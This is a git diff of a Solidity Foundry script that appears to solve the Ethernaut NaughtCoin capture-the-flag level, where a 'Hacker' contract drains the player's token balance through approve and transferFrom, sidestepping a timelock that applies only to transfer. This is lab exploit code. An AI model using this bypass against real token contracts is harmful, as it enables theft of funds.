@@ -1,13 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';
+import "forge-std/Script.sol";
 
-import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
 
- interface IERC20 {
-  function approve(address spender, uint256 amount) external returns (bool);
-  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-  function balanceOf(address account) external view returns (uint256);
-}
+//  interface IERC20 {
+//   function approve(address spender, uint256 amount) external returns (bool);
+//   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+//   function balanceOf(address account) external view returns (uint256);
+// }
 
 interface INaughtCoin {
   function player() external view returns(address);
@@ -48,13 +49,8 @@ interface INaughtCoin {
 } 
 
 contract Hacker {
-    constructor (address target) {
-        INaughtCoin naughtCoin = INaughtCoin(target);
-        address player = naughtCoin.player();
-        NaughtCoin naughtCoinInstance = new NaughtCoin(player);
-        IERC20 erc20 = IERC20(target);
-        erc20.approve(address(this), 1000000 * (10**uint256(naughtCoinInstance.decimals())));
-        erc20.transferFrom(player, address(this), 1000000 * (10**uint256(naughtCoinInstance.decimals())));
+    function hack (address player, uint256 balance, IERC20 erc20) public {
+        erc20.transferFrom(player, address(this), balance);
     }
 }
 
@@ -64,7 +60,14 @@ contract DeployScript is Script {
     function run() public {
         uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
         vm.startBroadcast(deployerPrivateKey);
-        new Hacker(0xe86aD0CE96D53194c4E49c8009946Eaf937f3Ae8);
+        address naught = 0xe86aD0CE96D53194c4E49c8009946Eaf937f3Ae8;
+        NaughtCoin naughtCoin = NaughtCoin(naught);
+        Hacker hacker = new Hacker();
+        address player = naughtCoin.player();
+        IERC20 erc20 = IERC20(address(naught));
+        uint256 balance = erc20.balanceOf(player);
+        erc20.approve(address(hacker), balance);
+        hacker.hack(player, balance, erc20);
         vm.stopBroadcast();
     }
 }
